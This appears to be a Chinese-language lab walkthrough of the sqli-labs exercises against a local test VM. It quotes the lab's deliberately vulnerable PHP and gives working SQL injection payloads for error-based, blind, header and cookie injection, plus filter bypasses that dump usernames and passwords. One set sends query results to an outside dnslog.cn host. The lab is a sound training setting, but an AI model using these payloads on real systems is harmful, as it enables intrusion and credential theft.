<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606190045141.png" alt="image-20230606190045141" style="zoom:50%;" />

#### 拖库

```
passwd=123') and extractvalue(0x7e, concat(0x7e, (select substring((group_concat(username,":",password)),1,30) from users)))#&Submit=Submit&uname=admin
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606190137960.png" alt="image-20230606190137960" style="zoom:50%;" />

## POST注入-盲注

### 布尔盲注-Less-15

```
# 爆表
passwd=123' or ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 1,1), 1,1)) <= 115
#&Submit=Submit
&uname=123
# 爆字段
passwd=123' or ascii(substring((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1), 1,1)) >= 115
#&Submit=Submit
&uname=123
# 爆值
passwd=123' or ascii(substring((select username from users limit 1,1), 1,1)) <= 115
#&Submit=Submit
&uname=123
```

### 时间盲注-Less-15

```
# 爆表
passwd=123' or if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 1,1), 1,1)) <= 115,sleep(0),sleep(3))#&Submit=Submit
&uname=123
# 爆字段
passwd=123' or if(ascii(substring((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1), 1,1)) <= 115,sleep(0),sleep(3))#&Submit=Submit
&uname=123
# 爆值
passwd=123' or if(ascii(substring((select username from users limit 1,1), 1,1)) <= 115,sleep(0),sleep(3))#&Submit=Submit&uname=123
```

### DNSLog盲注-Less-15

```
# 查看当前数据库
passwd=123' and (select load_file(concat("//", (select database()), ".2vajg1.dnslog.cn/asa")))#&Submit=Submit&uname=admin
# 爆表
passwd=123' and (select load_file(concat("//", (select table_name from information_schema.tables where table_schema=database() limit 1,1), ".2vajg1.dnslog.cn/asa")))#&Submit=Submit&uname=admin
# 爆字段
passwd=123' and (select load_file(concat("//", (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1), ".2vajg1.dnslog.cn/asa")))#&Submit=Submit&uname=admin
# 爆值
passwd=123' and (select load_file(concat("//", (select username from users limit 1,1), ".2vajg1.dnslog.cn/asa")))#&Submit=Submit&uname=admin
passwd=123' and (select load_file(concat("//", (select password from users limit 1,1), ".2vajg1.dnslog.cn/asa")))#&Submit=Submit&uname=admin
```

## POST注入-UserAgent注入

> 有关于所有利用头部标签来注入的，基本都需要靠白盒测试

### 注入原理

后台获取HTTP头的UserAgent信息，并没有做安全过滤，直接写入数据库！任何于数据库交互的地方都有可能出现SQL注入

#### 源码审计

```php
<?php
        //including the Mysql connect parameters.
        include("../sql-connections/sql-connect.php");
        error_reporting(0);
		
		# 对输出进行转义实体化函数
        function check_input($value)
        {
            if (!empty($value)) {
                // truncation (see comments)
                $value = substr($value, 0, 20);
            }

            // Stripslashes if magic quotes enabled
            if (get_magic_quotes_gpc()) {
                $value = stripslashes($value);
            }

            // Quote if not a number
            if (!ctype_digit($value)) {
                $value = "'" . mysql_real_escape_string($value) . "'";
            } else {
                $value = intval($value);
            }
            return $value;
        }

		# 获取User-Agent
        $uagent = $_SERVER['HTTP_USER_AGENT'];
		# 获取IP地址
        $IP = $_SERVER['REMOTE_ADDR'];
        echo "<br>";
        echo 'Your IP ADDRESS is: ' . $IP;
        echo "<br>";
        //echo 'Your User Agent is: ' .$uagent;
        // take the variables
        if (isset($_POST['uname']) && isset($_POST['passwd'])) {
            # 对username和password都进行了实体化，没有办法注入
            $uname = check_input($_POST['uname']);
            $passwd = check_input($_POST['passwd']);

            /*
            echo 'Your Your User name:'. $uname;
            echo "<br>";
            echo 'Your Password:'. $passwd;
            echo "<br>";
            echo 'Your User Agent String:'. $uagent;
            echo "<br>";
            echo 'Your User Agent String:'. $IP;
            */

            //logging the connection parameters to a file for analysis.	
            $fp = fopen('result.txt', 'a');
            fwrite($fp, 'User Agent:' . $uname . "\n");

            fclose($fp);

			# 与数据库进行了交互，但是username和password都进行了转义处理，无法利用
            $sql = "SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
            $result1 = mysql_query($sql);
            $row1 = mysql_fetch_array($result1);
            # 只有成功登录才能触发下面的代码，否则程序执行完毕
            if ($row1) {
                echo '<font color= "#FFFF00" font size = 3 >';
                # 与数据库进行了交互，可以发现没有对”User-Agent“做任何安全过滤，所以$uagent是注入点
                # $IP是在传输层获取的，值的获取并非来自HTTP头部，所以无法利用
                $insert = "INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
                mysql_query($insert);
                //echo 'Your IP ADDRESS is: ' .$IP;
                echo "</font>";
                //echo "<br>";
                echo '<font color= "#0000ff" font size = 3 >';
                echo 'Your User Agent is: ' . $uagent;
                echo "</font>";
                echo "<br>";
                print_r(mysql_error());
                echo "<br><br>";
                echo '<img src="../images/flag.jpg"  />';
                echo "<br>";

            } else {
                echo '<font color= "#0000ff" font size="3">';
                //echo "Try again looser";
                print_r(mysql_error());
                echo "</br>";
                echo "</br>";
                echo '<img src="../images/slap.jpg"   />';
                echo "</font>";
            }

        }

        ?>
```

#### 本地数据库尝试

对于insert语句，任然可以做报错注入，成功获取到数据库信息

```bash
mysql> INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('1' or extractvalue(0x7e, concat(0x7e, (select database()))), '2', 3);# ', '2', '3');
ERROR 1105 (HY000): XPATH syntax error: '~security'
```

### 注入流程-Less-18

==**要想成功复现，必须先成功登录**==

#### 获取当前数据库名

```
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36' and extractvalue(0x7e, concat(0x7e, (select database()))), '2', 3)#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606225942197.png" alt="image-20230606225942197" style="zoom:50%;" />

#### 爆库

```
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36' and extractvalue(0x7e, concat(0x7e, (select schema_name from information_schema.schemata limit 1,1))), '2', 3)#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606230248421.png" alt="image-20230606230248421" style="zoom:50%;" />

#### 爆表

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606230358678.png" alt="image-20230606230358678" style="zoom:50%;" />

#### 爆字段

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606230508282.png" alt="image-20230606230508282" style="zoom:50%;" />

#### 拖库

```
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36' and extractvalue(0x7e, concat(0x7e, (select concat(username,':',password) from users limit 1,1))), '2', 3)#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606230637531.png" alt="image-20230606230637531" style="zoom:50%;" />

## POST注入-Referer注入

### 注入原理

与User-Agent注入原理一样，操作也一样，只是注入的地方不同

#### 源码审计

```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <title>Less-19 Header Injection- Referer- Error Based- string</title>
</head>

<body bgcolor="#000000">

<div style=" margin-top:20px;color:#FFF; font-size:24px; text-align:center"> Welcome&nbsp;&nbsp;&nbsp;<font
            color="#FF0000"> Dhakkan </font><br></div>
<div align="center"
     style="margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;">
    <div style="padding-top:10px; font-size:15px;">


        <!--Form to post the contents -->
        <form action="" name="form1" method="post">

            <div style="margin-top:15px; height:30px;">Username : &nbsp;&nbsp;&nbsp;
                <input type="text" name="uname" value=""/></div>

            <div> Password : &nbsp; &nbsp;
                <input type="text" name="passwd" value=""/></div>
            </br>
            <div style=" margin-top:9px;margin-left:90px;"><input type="submit" name="submit" value="Submit"/></div>
        </form>
    </div>
</div>
<div style=" margin-top:10px;color:#FFF; font-size:23px; text-align:center">
    <font size="3" color="#FFFF00">


        <?php
        //including the Mysql connect parameters.
        include("../sql-connections/sql-connect.php");
        error_reporting(0);

        function check_input($value)
        {
            if (!empty($value)) {
                // truncation (see comments)
                $value = substr($value, 0, 20);
            }

            // Stripslashes if magic quotes enabled
            if (get_magic_quotes_gpc()) {
                $value = stripslashes($value);
            }

            // Quote if not a number
            if (!ctype_digit($value)) {
                $value = "'" . mysql_real_escape_string($value) . "'";
            } else {
                $value = intval($value);
            }
            return $value;
        }


        $uagent = $_SERVER['HTTP_REFERER'];
        $IP = $_SERVER['REMOTE_ADDR'];
        echo "<br>";
        echo 'Your IP ADDRESS is: ' . $IP;
        echo "<br>";
        //echo 'Your User Agent is: ' .$uagent;
        // take the variables
        if (isset($_POST['uname']) && isset($_POST['passwd'])) {
            $uname = check_input($_POST['uname']);
            $passwd = check_input($_POST['passwd']);

            /*
            echo 'Your Your User name:'. $uname;
            echo "<br>";
            echo 'Your Password:'. $passwd;
            echo "<br>";
            echo 'Your User Agent String:'. $uagent;
            echo "<br>";
            echo 'Your User Agent String:'. $IP;
            */

            //logging the connection parameters to a file for analysis.
            $fp = fopen('result.txt', 'a');
            fwrite($fp, 'Referer:' . $uname . "\n");

            fclose($fp);


            $sql = "SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
            $result1 = mysql_query($sql);
            $row1 = mysql_fetch_array($result1);
            # 只有先登录成功才能触法注入点
            if ($row1) {
                echo '<font color= "#FFFF00" font size = 3 >';
                # 可以看到并没有对变量 $uagent 做任何的安全过滤
                $insert = "INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')";
                mysql_query($insert);
                //echo 'Your IP ADDRESS is: ' .$IP;
                echo "</font>";
                //echo "<br>";
                echo '<font color= "#0000ff" font size = 3 >';
                echo 'Your Referer is: ' . $uagent;
                echo "</font>";
                echo "<br>";
                print_r(mysql_error());
                echo "<br><br>";
                echo '<img src="../images/flag.jpg" />';
                echo "<br>";

            } else {
                echo '<font color= "#0000ff" font size="3">';
                //echo "Try again looser";
                print_r(mysql_error());
                echo "</br>";
                echo "</br>";
                echo '<img src="../images/slap.jpg"  />';
                echo "</font>";
            }

        }

        ?>


    </font>
</div>
</body>
</html>
```

#### 本地数据库尝试

```
mysql> INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('1' and extractvalue(1,concat(0x7e, (select database()))), '2');#', '2');
ERROR 1105 (HY000): XPATH syntax error: '~security'
```

### 注入流程-Less-19

#### 查看当前数据库

```
Referer: http://192.168.231.129:9001/Less-19/' and extractvalue(1,concat(0x7e, (select database()))), '2')#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606233901505.png" alt="image-20230606233901505" style="zoom:50%;" />

#### 爆库

```
Referer: http://192.168.231.129:9001/Less-19/' and extractvalue(1,concat(0x7e, (select schema_name from information_schema.schemata limit 4,1))), '2')#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606234013256.png" alt="image-20230606234013256" style="zoom:50%;" />

#### 爆表

```
Referer: http://192.168.231.129:9001/Less-19/' and extractvalue(1,concat(0x7e, (select table_name from information_schema.tables where table_schema=database() limit 1,1))), '2')#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606234238850.png" alt="image-20230606234238850" style="zoom:50%;" />

#### 爆字段

```
Referer: http://192.168.231.129:9001/Less-19/' and extractvalue(1,concat(0x7e, (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1))), '2')#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606234322880.png" alt="image-20230606234322880" style="zoom:50%;" />

#### 拖库

```
Referer: http://192.168.231.129:9001/Less-19/' and extractvalue(1,concat(0x7e, (select concat(username,':',password) from users limit 1,1))), '2')#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230606234532761.png" alt="image-20230606234532761" style="zoom:50%;" />

## POST注入-Cookie注入

### 注入原理

#### 源码审计

```php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>

    <title>Less-20 Cookie Injection- Error Based- string</title>
</head>

<body bgcolor="#000000">
<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
if (!isset($_COOKIE['uname'])) {
    //including the Mysql connect parameters.
    include("../sql-connections/sql-connect.php");

    echo "<div style=' margin-top:20px;color:#FFF; font-size:24px; text-align:center'> Welcome&nbsp;&nbsp;&nbsp;<font color='#FF0000'> Dhakkan </font><br></div>";
    echo "<div  align='center' style='margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;'>";
    echo "<div style='padding-top:10px; font-size:15px;'>";


    echo "<!--Form to post the contents -->";
    echo '<form action=" " name="form1" method="post">';

    echo ' <div style="margin-top:15px; height:30px;">Username : &nbsp;&nbsp;&nbsp;';
    echo '   <input type="text"  name="uname" value=""/>  </div>';

    echo ' <div> Password : &nbsp; &nbsp; &nbsp;';
    echo '   <input type="text" name="passwd" value=""/></div></br>';
    echo '   <div style=" margin-top:9px;margin-left:90px;"><input type="submit" name="submit" value="Submit" /></div>';

    echo '</form>';
    echo '</div>';
    echo '</div>';
    echo '<div style=" margin-top:10px;color:#FFF; font-size:23px; text-align:center">';
    echo '<font size="3" color="#FFFF00">';
    echo '<center><br><br><br>';
    echo '<img src="../images/Less-20.jpg" />';
    echo '</center>';


    function check_input($value)
    {
        if (!empty($value)) {
            $value = substr($value, 0, 20); // truncation (see comments)
        }
        if (get_magic_quotes_gpc())  // Stripslashes if magic quotes enabled
        {
            $value = stripslashes($value);
        }
        if (!ctype_digit($value))    // Quote if not a number
        {
            $value = "'" . mysql_real_escape_string($value) . "'";
        } else {
            $value = intval($value);
        }
        return $value;
    }


    echo "<br>";
    echo "<br>";

    if (isset($_POST['uname']) && isset($_POST['passwd'])) {

        $uname = check_input($_POST['uname']);
        $passwd = check_input($_POST['passwd']);


        $sql = "SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
        $result1 = mysql_query($sql);
        $row1 = mysql_fetch_array($result1);
        $cookee = $row1['username'];
        if ($row1) {
            echo '<font color= "#FFFF00" font size = 3 >';
            setcookie('uname', $cookee, time() + 3600);
            header('Location: index.php');
            echo "I LOVE YOU COOKIES";
            echo "</font>";
            echo '<font color= "#0000ff" font size = 3 >';
            //echo 'Your Cookie is: ' .$cookee;
            echo "</font>";
            echo "<br>";
            print_r(mysql_error());
            echo "<br><br>";
            echo '<img src="../images/flag.jpg" />';
            echo "<br>";
        } else {
            echo '<font color= "#0000ff" font size="3">';
            //echo "Try again looser";
            print_r(mysql_error());
            echo "</br>";
            echo "</br>";
            echo '<img src="../images/slap.jpg" />';
            echo "</font>";
        }
    }

    echo "</font>";
    echo '</font>';
    echo '</div>';

} else {


    if (!isset($_POST['submit'])) {

        $cookee = $_COOKIE['uname'];
        $format = 'D d M Y - H:i:s';
        $timestamp = time() + 3600;
        echo "<center>";
        echo '<br><br><br>';
        echo '<img src="../images/Less-20.jpg" />';
        echo "<br><br><b>";
        echo '<br><font color= "red" font size="4">';
        echo "YOUR USER AGENT IS : " . $_SERVER['HTTP_USER_AGENT'];
        echo "</font><br>";
        echo '<font color= "cyan" font size="4">';
        echo "YOUR IP ADDRESS IS : " . $_SERVER['REMOTE_ADDR'];
        echo "</font><br>";
        echo '<font color= "#FFFF00" font size = 4 >';
        echo "DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE <br>";
        echo '<font color= "orange" font size = 5 >';
        echo "YOUR COOKIE : uname = $cookee and expires: " . date($format, $timestamp);


        echo "<br></font>";
        # 注入点在这里，由于使用的是 SELECT 语句，所以这里可以使用UNION注入和报错注入
        $sql = "SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";
        $result = mysql_query($sql);
        if (!$result) {
            die('Issue with your mysql: ' . mysql_error());
        }
        $row = mysql_fetch_array($result);
        if ($row) {
            echo '<font color= "pink" font size="5">';
            echo 'Your Login name:' . $row['username'];
            echo "<br>";
            echo '<font color= "grey" font size="5">';
            echo 'Your Password:' . $row['password'];
            echo "</font></b>";
            echo "<br>";
            echo 'Your ID:' . $row['id'];
        } else {
            echo "<center>";
            echo '<br><br><br>';
            echo '<img src="../images/slap1.jpg" />';
            echo "<br><br><b>";
            //echo '<img src="../images/Less-20.jpg" />';
        }
        echo '<center>';
        echo '<form action="" method="post">';
        echo '<input  type="submit" name="submit" value="Delete Your Cookie!" />';
        echo '</form>';
        echo '</center>';
    } else {
        echo '<center>';
        echo "<br>";
        echo "<br>";
        echo "<br>";
        echo "<br>";
        echo "<br>";
        echo "<br>";
        echo '<font color= "#FFFF00" font size = 6 >';
        echo " Your Cookie is deleted";
        setcookie('uname', $row1['username'], time() - 3600);
        header('Location: index.php');
        echo '</font></center></br>';

    }


    echo "<br>";
    echo "<br>";
    //header ('Location: main.php');
    echo "<br>";
    echo "<br>";

    //echo '<img src="../images/slap.jpg" /></center>';
    //logging the connection parameters to a file for analysis.
    $fp = fopen('result.txt', 'a');
    fwrite($fp, 'Cookie:' . $cookee . "\n");

    fclose($fp);

}
?>

</body>
</html>
```

### 注入流程-Less-20

#### 爆库

```
Cookie: uname=admin' and extractvalue(1,concat(0x7e, (select schema_name from information_schema.schemata limit 1,1)))#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607131436241.png" alt="image-20230607131436241" style="zoom:50%;" />

#### 爆表

```
Cookie: uname=' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607131709364.png" alt="image-20230607131709364" style="zoom:50%;" />

#### 爆字段

```
Cookie: uname=' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607131806885.png" alt="image-20230607131806885" style="zoom:50%;" />

#### 拖库

```
Cookie: uname=' union select 1,2,group_concat(username,':',password) from users#
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607131942154.png" alt="image-20230607131942154" style="zoom: 50%;" />

## 注释符过滤的绕过

### 过滤原理

#### 源码审计

这里没办法做双写绕过，所以只能想办法闭合掉最后的一个单引号

```php
# 注释符过滤，将所有的注释符替换为空
//filter the comments out so as to comments should not work
$reg = "/#/";
$reg1 = "/--/";
$replace = "";
$id = preg_replace($reg, $replace, $id);
$id = preg_replace($reg1, $replace, $id);

$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
```

### 注入流程-Less-23

#### 尝试注释符绕过

可以发现成功绕过，并得到报错信息

```
http://192.168.231.129:9001/Less-23/?id=' union select 1,2,3,4 or '1'='1
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607133614106.png" alt="image-20230607133614106" style="zoom: 33%;" />

#### 寻找回显位

```
http://192.168.231.129:9001/Less-23/?id=' union select 1,2,3 or '1'='1
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607133738158.png" alt="image-20230607133738158" style="zoom: 33%;" />

#### 查看当前数据库

```
http://192.168.231.129:9001/Less-23/?id=' union select 1,database(),3 or '2'='2
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607133833450.png" alt="image-20230607133833450" style="zoom: 33%;" />

#### 爆库

使用UNION + where 的方式完成

```
http://192.168.231.129:9001/Less-23/?id=' union select 1,group_concat(username,':',password),3  from users where '1'='1
```



这里使用别名的方式，起一个别名`'2'`来闭合后面的单引号

```
http://192.168.231.129:9001/Less-23/?id=' union select 1,group_concat(schema_name),3 as '2' from information_schema.schemata group by '2
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607134310968.png" alt="image-20230607134310968" style="zoom: 33%;" />

#### 爆表

```
http://192.168.231.129:9001/Less-23/?id=' union select 1,group_concat(table_name),3 as '2' from information_schema.tables where table_schema=database() group by '2
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607134353199.png" alt="image-20230607134353199" style="zoom: 33%;" />

#### 拖库

```
http://192.168.231.129:9001/Less-23/?id=' union select 1,group_concat(column_name),3 as '2' from information_schema.columns where table_schema=database() and table_name='users' group by '2
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607134510375.png" alt="image-20230607134510375" style="zoom: 33%;" />

#### 拖库

```
http://192.168.231.129:9001/Less-23/?id=' union select 1,group_concat(username,':',password),3 as '2' from users group by '2
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607134551039.png" alt="image-20230607134551039" style="zoom: 33%;" />

## and和or的绕过

### 常见绕过手法

```
# 使用大小写绕过
?id=1 AnD 1=1--+
# 双写绕过
?id=1 aandnd 1=1 --+
# 用&&取代and，用||取代or
?id=1' && 1=1 --+
```

### 注入原理

#### 源码审计

这里很明显只对大小写进行了过滤，典型的双写绕过代码

```php
function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/AND/i',"", $id);		//Strip out AND (non case sensitive)
	
	return $id;
}
```

### 注入流程-Less-25

#### 查看当前数据库

```
http://192.168.231.129:9001/Less-25/?id=0' union select 1,database(),3%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607142042185.png" alt="image-20230607142042185" style="zoom: 33%;" />

#### 爆库

这里因为 information 这个单词包含了or，所以中间也要做双写

```
http://192.168.231.129:9001/Less-25/?id=0' union select 1,group_concat(schema_name),3 from infoorrmation_schema.schemata%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607142207745.png" alt="image-20230607142207745" style="zoom: 33%;" />

#### 爆表

```
http://192.168.231.129:9001/Less-25/?id=0' union select 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=database()%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607142247220.png" alt="image-20230607142247220" style="zoom: 33%;" />

#### 爆字段

```
http://192.168.231.129:9001/Less-25/?id=0' union select 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_schema=database() aandnd table_name='users'%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607142429038.png" alt="image-20230607142429038" style="zoom: 33%;" />

#### 拖库

```
http://192.168.231.129:9001/Less-25/?id=0' union select 1,group_concat(username,':',passwoorrd),3 from users%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607142535109.png" alt="image-20230607142535109" style="zoom: 33%;" />

## 空格绕过

### 绕过手法

1. 使用 + 号代替空格

2. 使用URL编码代替空格

   ```
   spaces -------------------- %20
   TAB 09 horizontal TAB ----- %09
   LF OA newline ------------- %0A
   F 0C new page ------------- %0C
   CR 0D carriage return ----- %0D
   VT 0B vertival TAB -------- %0B
   -OA-(MySQL only) ---------- %0A
   ```

### 注入原理

#### 代码审计

源码中对下面的字符串都做了空的替换

```
function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/and/i',"", $id);		//Strip out AND (non case sensitive)
	$id= preg_replace('/[\/\*]/',"", $id);		//strip out /*
	$id= preg_replace('/[--]/',"", $id);		//Strip out --
	$id= preg_replace('/[#]/',"", $id);			//Strip out #
	$id= preg_replace('/[\s]/',"", $id);		//Strip out spaces
	$id= preg_replace('/[\/\\\\]/',"", $id);		//Strip out slashes
	return $id;
}
```

### 注入流程-Less-26

#### 尝试绕过空格

正常回显，成功绕过

```
http://192.168.231.129:9001/Less-26/?id=0'%0Boorr'1'='1
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607145645271.png" alt="image-20230607145645271" style="zoom: 33%;" />

#### 判断回显位

```
http://192.168.231.129:9001/Less-26/?id=0'%0Bunion%0Bselect%0B1,2,3%0Boorr%0B'1'='1
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607145730891.png" alt="image-20230607145730891" style="zoom: 33%;" />

#### 查看当前数据库名

```
http://192.168.231.129:9001/Less-26/?id=0'%0Bunion%0Bselect%0B1,database(),3%0Boorr%0B'1'='1
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607145830944.png" alt="image-20230607145830944" style="zoom: 33%;" />

#### 爆库

```
http://192.168.231.129:9001/Less-26/?id=0'%0Bunion%0Bselect%0B1,group_concat(schema_name),3%0Bfrom%0Binfoorrmation_schema.schemata%0Bwhere%0B'1'='1
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607150009196.png" alt="image-20230607150009196" style="zoom: 33%;" />

#### 爆表

```
http://192.168.231.129:9001/Less-26/?id=0'%0Bunion%0Bselect%0B1,group_concat(table_name),3%0Bfrom%0Binfoorrmation_schema.tables%0Bwhere%0Btable_schema=database()%0Baandnd%0B'1'='1
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607150250397.png" alt="image-20230607150250397" style="zoom: 33%;" />

#### 爆字段

```
http://192.168.231.129:9001/Less-26/?id=0'%0Bunion%0Bselect%0B1,group_concat(column_name),3%0Bfrom%0Binfoorrmation_schema.columns%0Bwhere%0Btable_schema=database()%0Banandd%0Btable_name='users'%0Baandnd%0B'1'='1
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607150349267.png" alt="image-20230607150349267" style="zoom: 33%;" />

#### 拖库

```
http://192.168.231.129:9001/Less-26/?id=0'%0Bunion%0Bselect%0B1,group_concat(username,':',passwoorrd),3%0Bfrom%0Busers%0Bwhere%0B'1'='1
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607150507387.png" alt="image-20230607150507387" style="zoom: 33%;" />

## 逗号绕过

### 前置知识

#### `join()`函数

原理：

1. 从第一张表依次取出每一条记录
2. 取出每一条记录之后，与另外一种表的全部记录挨个匹配
3. 没有任何匹配条件，所有的结果全都会进行保留

```
mysql> select u.*,e.* from users as u join emails as e on e.id=u.id;
+----+----------+------------+----+------------------------+
| id | username | password   | id | email_id               |
+----+----------+------------+----+------------------------+
|  1 | Dumb     | Dumb       |  1 | Dumb@dhakkan.com       |
|  2 | Angelina | I-kill-you |  2 | Angel@iloveu.com       |
|  3 | Dummy    | p@ssword   |  3 | Dummy@dhakkan.local    |
|  4 | secure   | crappy     |  4 | secure@dhakkan.local   |
|  5 | stupid   | stupidity  |  5 | stupid@dhakkan.local   |
|  6 | superman | genious    |  6 | superman@dhakkan.local |
|  7 | batman   | mob!le     |  7 | batman@dhakkan.local   |
|  8 | admin    | admin      |  8 | admin@dhakkan.com      |
+----+----------+------------+----+------------------------+
8 rows in set (0.01 sec)
```

配合UNION查询使用

```
mysql> select * from users where id=1 union select * from (select 1)a join (select 2)b join (select 3)c;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
|  1 | 2        | 3        |
+----+----------+----------+
2 rows in set (0.01 sec)
```

### 注入流程-Less-1

#### 判断回显点

在做这一步之前应该先判断查询列数，这里偷懒了

```
http://192.168.231.129:9001/Less-1/?id=0' union select * from (select 1)a join (select 2)b join (select 3)c%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607152842645.png" alt="image-20230607152842645" style="zoom: 33%;" />

#### 爆库

```
http://192.168.231.129:9001/Less-1/?id=0' union select * from (select 1)a join (select group_concat(schema_name) from information_schema.schemata)b join (select 3)c%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607152951844.png" alt="image-20230607152951844" style="zoom: 33%;" />

#### 爆表

```
http://192.168.231.129:9001/Less-1/?id=0' union select * from (select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema=database())b join (select 3)c%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607153112525.png" alt="image-20230607153112525" style="zoom: 33%;" />

#### 爆字段

```
http://192.168.231.129:9001/Less-1/?id=0' union select * from (select 1)a join (select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')b join (select 3)c%23
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230607153154738.png" alt="image-20230607153154738" style="zoom: 33%;" />

#### 拖库

```
http://192.168.231.129:9001/Less-1/?id=0' union select * from (select 1)a join (select group_concat(username,':',password) from users)b join (select 3)c#
```

